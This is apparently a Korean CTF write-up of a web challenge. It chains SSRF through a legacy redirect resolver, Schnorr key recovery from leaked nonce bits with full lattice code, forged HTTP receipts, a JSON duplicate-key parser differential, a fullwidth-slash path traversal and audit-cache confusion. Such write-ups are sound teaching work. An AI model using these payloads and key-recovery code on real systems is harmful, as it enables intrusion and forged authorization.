---
title: "[제2회 영남권 사이버 공격 방어 대회] Signed, Sealed, Oops"
date: 2026-10-16 16:26:00 +0900
categories: [CTF/Wargame]
tags: [ctf, web, ssrf, cryptography, parser-differential]
---

# Signed, Sealed, Oops - SSRF와 검증 로직 차이를 연결한 복합 공격

## 개요

- 분야: Web / SSRF / 암호 구현 취약점 / Parser Differential / 캐시 키 혼동 / TUF 경로 검증 우회
- 대상: `http://52.79.35.14:43209/`
- 계정: `external-auditor`
- 최종 플래그:

```text
flag{86e1093124b62fa245062de0b30a8444a10c85a09e934687ff2b1f26f3b1190e}
```

이 문제는 하나의 단순한 취약점으로 끝나지 않는다. 구버전 archive resolver를 이용해 내부 서비스에 접근하고, Schnorr nonce 일부 노출로 서명 키를 복구한 다음, JSON 파서 차이와 Unicode 정규화 차이를 연쇄적으로 이용해야 한다. 마지막에는 잘못 설계된 평가 캐시를 통해 production 감사 기록을 승인 상태로 만들고 플래그를 반환하는 release를 생성한다.

## 1. 초기 정찰

로그인 후 `/api/session`을 조회하면 다음과 같은 정보가 제공된다.

```json
{
  "username": "external-auditor",
  "role": "external-auditor",
  "registry": "http://app:3000/assets/schemas/base.json",
  "fetchProfile": "urn:relay:profile:managed-fetch-v2",
  "auditCases": "/api/audit/cases"
}
```

기본 schema를 가져오면 현재 resolver가 `res-6.3.4`라는 사실을 알 수 있다.

```http
GET /assets/schemas/base.json
```

```json
{
  "revision": "2026.3",
  "transport": {
    "mode": "registry-resolver",
    "adapterBuild": "res-6.3.4"
  }
}
```

지원하지 않는 revision을 요청하면 서버가 과거 revision 목록을 헤더로 노출한다.

```http
GET /assets/schemas/base.json?revision=invalid
```

```text
Accept-Schema-Revision: 2026.3, 2026.1, 2025.7, 2025.4
```

특히 `2025.4`의 응답은 구버전 archive reader를 가리킨다.

```json
{
  "revision": "2025.4",
  "transport": {
    "mode": "archive-reader",
    "template": "/assets/schemas/archive-r54/{base64url-absolute-uri}.json",
    "binding": "renderer-v2",
    "adapterBuild": "arc-5.4.31"
  }
}
```

## 2. archive-r54를 이용한 SSRF

`archive-r57`은 목적지 호스트를 제한하지만, 이전 구현인 `archive-r54`는 Base64URL로 인코딩된 임의의 절대 URI를 그대로 `Location` 헤더에 넣어 리다이렉트한다.

예를 들어 다음 내부 주소를 Base64URL로 인코딩한다.

```text
http://policy-vault:4000/.well-known/relay
```

```bash
printf %s 'http://policy-vault:4000/.well-known/relay' \
  | base64 -w0 | tr '+/' '-_' | tr -d '='
```

이를 다음과 같은 허용된 schema URL에 넣어 import한다.

```text
http://app:3000/assets/schemas/archive-r54/<BASE64URL>.json
```

애플리케이션의 managed fetcher는 최초 URL만 허용 목록과 비교한 뒤 리다이렉트를 따라간다. 따라서 최종적으로 내부 호스트인 `policy-vault:4000`의 응답이 import 진단 결과에 기록된다.

서비스 discovery 결과는 다음과 같다.

```json
{
  "linkset": [{
    "anchor": "urn:relay:renderer-v2",
    "item": [{
      "href": "/v4/journal?cursor=head-93",
      "rel": "collection",
      "type": "application/x-ndjson"
    }]
  }],
  "verifier": {
    "kid": "legacy-relay-signer-7",
    "publicKey": "d4e334f0...34ca21"
  }
}
```

## 3. Schnorr nonce 노출과 개인 키 복구

SSRF로 다음 두 journal page를 읽을 수 있다.

```text
/v4/journal?cursor=head-93
/v4/journal?cursor=spill-f2
```

총 10개의 Schnorr 서명 영수증이 있으며 각 영수증에는 다음 telemetry가 포함돼 있다.

```json
{
  "noncePrefix": "15c3c750...e99f861a",
  "redactedLowBits": 540
}
```

알고리즘 문서는 공개 schema에서 확인할 수 있다.

```text
/assets/schemas/profiles/receipt-algorithm.json
```

주요 파라미터는 다음과 같다.

```text
p = FFFFFFFF...FFFFFFFF
q = (p - 1) / 2
g = 4
e = SHAKE256(canonical, 128 bytes) mod q
s = k + e*x mod q
```

각 nonce는 다음 형태다.

```text
k_i = (noncePrefix_i << 540) + delta_i
0 <= delta_i < 2^540
```

따라서 각 서명에 대해 다음 Hidden Number Problem 식을 얻는다.

```text
s_i - e_i*x = K_i + delta_i (mod q)
K_i = noncePrefix_i << 540
```

10개 표본을 이용해 LLL/CVP를 수행하면 개인 키 `x`를 복구할 수 있다. 복구한 키는 반드시 아래 식으로 검증한다.

```python
assert pow(g, x, p) == public_key
```

복구된 개인 키는 다음과 같았다.

```text
0x133003e1295a213e88cb1ad19972777b5bfe34ab2dbd9c1b7206aeaac538ef98ff6351e94a170b19baae2409cf37dfa7d48b0db8edbe080d880f15c14d441899143b27e580b57e9c1b2a3475f40565ec76cf510589581e44d0ef4b7f7a0dc546
```

격자 구성의 핵심 부분은 다음과 같다. `samples`는 journal에서 수집한 `(canonical, s, noncePrefix)` 튜플이다.

```python
from hashlib import shake_256
from fpylll import IntegerMatrix, LLL, CVP

B = 1 << 540
es = []
targets = []

for message, s_hex, prefix_hex in samples:
    e = int.from_bytes(shake_256(message.encode()).digest(128), "big") % q
    K = int(prefix_hex, 16) << 540
    es.append(e)
    targets.append((int(s_hex, 16) - K) % q)

n = len(samples)
M = IntegerMatrix(n + 1, n + 1)

for i in range(n):
    M[i, i] = q * q

for i, e in enumerate(es):
    M[n, i] = e * q

M[n, n] = B
target = [a * q for a in targets] + [0]

LLL.reduction(M)
closest = CVP.closest_vector(M, target)
x = (closest[-1] // B) % q

if pow(g, x, p) != public_key:
    x = (-x) % q

assert pow(g, x, p) == public_key
```

## 4. HTTP receipt 위조

HTTP canonicalization 문서는 다음과 같다.

```text
/assets/schemas/profiles/http-canonicalization.json
```

서명 대상은 method, path, authority뿐이다.

```text
"@method": GET
"@path": /v4/artifacts/export
"@authority": policy-vault:4000
```

복구한 개인 키를 이용하면 다음 방식으로 유효한 receipt를 만들 수 있다.

```python
import base64
import json
import secrets

canonical = '\n'.join([
    '"@method": GET',
    '"@path": /v4/artifacts/export',
    '"@authority": policy-vault:4000',
])

k = secrets.randbelow(q - 1) + 1
R = pow(g, k, p)
e = int.from_bytes(shake_256(canonical.encode()).digest(128), "big") % q
s = (k + e * x) % q

receipt = {
    "kid": "legacy-relay-signer-7",
    "R": format(R, "x"),
    "s": format(s, "x")
}

token = base64.urlsafe_b64encode(
    json.dumps(receipt, separators=(",", ":")).encode()
).rstrip(b"=").decode()
```

기존 import에 `application/merge-patch+json`으로 POST하면 사용자 지정 헤더를 넣어 재시도할 수 있다. `note` 필드는 필수다.

```json
{
  "note": "retry cloned source export",
  "execution": {
    "request": {
      "headers": {
        "x-relay-receipt": "<FORGED_RECEIPT>",
        "x-artifact-job": "job_aud_01JQ6X2D9V4K7M3P8H5T0NBRFC",
        "x-artifact-source": "job_prd_01JQ7B9W2C6F4R8K3M5T0XNVHD"
      }
    }
  }
}
```

receipt는 method, path, authority만 서명한다. `X-Artifact-Job`과 `X-Artifact-Source`는 서명 대상이 아니므로 audit 범위의 clone job을 유지하면서 원본만 production job으로 바꿀 수 있다.

성공 응답으로 draft capability가 발급된다.

```json
{
  "kind": "draft-entitlement",
  "grant": "grant:renderer-v2:external-clone:2026-09",
  "draftCapability": {
    "id": "cap_...",
    "manifestEndpoint": "/api/capabilities/cap_.../base-manifest"
  }
}
```

## 5. JSON Parser Differential로 production manifest 실행

base manifest는 audit sample을 가리키며 HS256 서명을 포함한다.

```json
"source": {
  "uri": "http://policy-vault:4000/v6/artifacts/audit/sample",
  "sha256": "d38afb83a335da2a88b2921260a5bee59fed92313e0714980cd456076aeb8755"
}
```

draft linter는 동일한 property token의 중복을 차단하지만, JSON escape를 정규화한 뒤의 중복까지 탐지하지 않는다. 따라서 `source`와 `s\u006furce`를 동시에 넣을 수 있다.

```json
"artifact": {
  "subject": "external-audit-sample",
  "source": {
    "uri": "http://policy-vault:4000/v6/artifacts/audit/sample",
    "sha256": "d38afb83a335da2a88b2921260a5bee59fed92313e0714980cd456076aeb8755",
    "mediaType": "application/vnd.relay.artifact+json"
  },
  "s\u006furce": {
    "uri": "http://policy-vault:4000/v6/artifacts/production/signing-2026-09"
  },
  "materialize": "source"
}
```

검증기는 첫 번째 `source`를 기준으로 기존 서명과 digest를 검증한다. 반면 실행기는 일반 JSON parsing 결과의 마지막 값을 사용하므로 production URI를 가져온다.

결과에서 두 관점이 명확히 갈린다.

```json
{
  "validation": {
    "signature": "verified",
    "contentDigest": "verified",
    "artifact": {
      "source": {
        "uri": "http://policy-vault:4000/v6/artifacts/audit/sample"
      }
    }
  },
  "execution": {
    "finalUrl": "http://policy-vault:4000/v6/artifacts/production/signing-2026-09",
    "status": 200
  }
}
```

production artifact의 압축 payload를 Base64URL decode하고 raw DEFLATE로 해제하면 TUF metadata capability를 획득한다.

```python
raw = base64.urlsafe_b64decode(payload + padding)
document = zlib.decompress(raw, -15)
```

## 6. Unicode 정규화 차이로 TUF 위임 범위 우회

TUF root → timestamp → snapshot → targets 순서로 metadata를 조회할 수 있다. 최상위 targets에는 다음 두 위임이 존재한다.

```text
partner-audit       -> partners/drop/*
production-evidence -> production/evidence/*
```

외부 감사 계정은 `production-evidence.json`과 production target을 직접 요청하면 403을 받는다.

resolution profile은 다음 endpoint에서 확인된다.

```text
/assets/schemas/profiles/tuf-resolution.json
```

resolution 요청에는 서명된 partner metadata, 검증할 descriptor, materialization target을 보낸다. 경로 정책 검사는 raw 문자열을 기준으로 하지만 storage key는 Unicode compatibility normalization을 적용한다.

ASCII `/` 대신 FULLWIDTH SOLIDUS인 `／`를 사용해 다음 target을 구성한다.

```text
partners/drop/..／..／production/evidence/signing-2026-09.attestation.json
```

정책 검사 시에는 `partners/drop/` 아래의 안전한 문자열처럼 보이지만, storage 단계에서 NFKC 계열 정규화가 적용되면 다음 경로가 된다.

```text
partners/drop/../../production/evidence/signing-2026-09.attestation.json
```

최종적으로 production evidence가 materialize된다.

```json
{
  "validation": {
    "role": "partner-audit",
    "signature": "verified",
    "descriptor": "verified",
    "scope": "partners/drop/..／..／production/evidence/signing-2026-09.attestation.json"
  },
  "resolution": {
    "target": "production/evidence/signing-2026-09.attestation.json",
    "auditAnchor": {
      "id": "anc_1bb73c93410844a3b7de7efa20100a46"
    }
  }
}
```

## 7. 감사 평가 캐시 혼동

감사 case는 다음 endpoint에서 확인한다.

```text
/api/audit/cases/inc-2026-09-signing
```

중요한 두 branch는 다음과 같다.

- `br-audit-41`: partner branch, `requestGroup = req-sep-signing-7`
- `br-prod-41`: production branch, `requestGroup = req-sep-signing-7`

평가 캐시가 principal, branch, checkpoint를 충분히 포함하지 않고 `requestGroup`을 중심으로 결과를 재사용한다.

새 세션에서 먼저 과거 승인 시점인 `cp-14`의 partner branch를 평가한다.

```json
{
  "branchHead": "br-audit-41-3",
  "chain": [
    "br-audit-41-1",
    "br-audit-41-2",
    "br-audit-41-3"
  ],
  "checkpoint": "cp-14",
  "requestGroup": "req-sep-signing-7"
}
```

응답은 `approved: true`, `cache: miss`가 된다. 이어서 동일 request group을 사용하는 production branch를 현재 checkpoint로 평가한다.

```json
{
  "branchHead": "br-prod-41-3",
  "chain": [
    "br-prod-41-1",
    "br-prod-41-2",
    "br-prod-41-3"
  ],
  "checkpoint": "cp-19",
  "requestGroup": "req-sep-signing-7"
}
```

production evidence는 원래 격리돼 있어야 하지만 partner 평가 결과가 재사용된다.

```json
{
  "principal": "production",
  "approved": true,
  "cache": "hit"
}
```

## 8. settlement 계산과 최종 release

`cp-19` 시점에서 각 package의 최신 package, quality, distribution row를 비교한다. 정책은 다음과 같다.

- package 상태가 `sealed`
- quality 상태가 `passed`
- distribution 상태가 `active`
- distribution의 `effectiveAt`이 quality보다 빠르지 않아야 함
- anchor의 production evidence target과 일치해야 함
- 조건을 만족하는 package 중 active distribution 시각이 가장 최신인 항목 선택

조건을 만족하는 package는 `pkg-41`이며 사용되는 row는 다음 세 개다.

```text
stl_010  package       sealed
stl_011  quality       passed
stl_013  distribution  active
```

settlement digest는 아래 세 줄을 LF로 연결한 값의 SHA-256이다. 마지막 줄 뒤에는 개행을 추가하지 않는다.

```text
stl_010:e50f0bca6e063694eef87671195cc5cd8ef6266e5be8f673a9fca100306acf72
stl_011:b58da6fe737a22b69dc782d4866b770051f7960839d7328e717d2de441f09367
stl_013:97f31c9065db0bb5e6d31ed607bee96666e083fce22d279a702adc05fe10a000
```

```text
sha256:80366b713f53388ffd2ac9df2d1913b8b0c37899d9d8bbb6129e10f9332360ec
```

캐시 혼동으로 승인된 production evaluation ID와 Unicode 우회로 획득한 anchor ID를 사용해 release를 요청한다.

```json
{
  "evaluationId": "<APPROVED_PRODUCTION_EVALUATION_ID>",
  "anchorId": "anc_1bb73c93410844a3b7de7efa20100a46",
  "settlement": {
    "packageId": "pkg-41",
    "records": ["stl_010", "stl_011", "stl_013"],
    "digest": "sha256:80366b713f53388ffd2ac9df2d1913b8b0c37899d9d8bbb6129e10f9332360ec"
  }
}
```

Content-Type은 반드시 다음 값을 사용한다.

```text
application/vnd.relay.audit-release+json
```

최종 응답에서 플래그를 얻는다.

```json
{
  "evidence": {
    "incident": "inc-2026-09-signing",
    "target": "production/evidence/signing-2026-09.attestation.json",
    "finding": "flag{86e1093124b62fa245062de0b30a8444a10c85a09e934687ff2b1f26f3b1190e}"
  }
}
```

## 취약점 요약

1. 최초 URL만 검사하고 redirect 목적지를 재검증하지 않는 SSRF
2. 보안 검사가 제거된 구버전 archive resolver가 계속 노출됨
3. Schnorr nonce의 상위 비트를 여러 서명에서 노출하여 HNP/LLL 공격 가능
4. HTTP 서명 대상에서 보안상 중요한 job/source 헤더 누락
5. JSON property escape를 고려하지 않는 중복 키 linter
6. 검증기와 실행기의 중복 JSON 키 처리 차이
7. 권한 검사와 storage lookup 사이의 Unicode 정규화 순서 불일치
8. principal, branch, checkpoint가 분리되지 않은 감사 평가 캐시 키

각 취약점은 단독으로는 플래그에 도달하지 못하지만, 서로 다른 신뢰 경계에서 발생한 해석 차이를 연결하면 외부 감사 계정으로 production evidence를 승인하고 release할 수 있다.

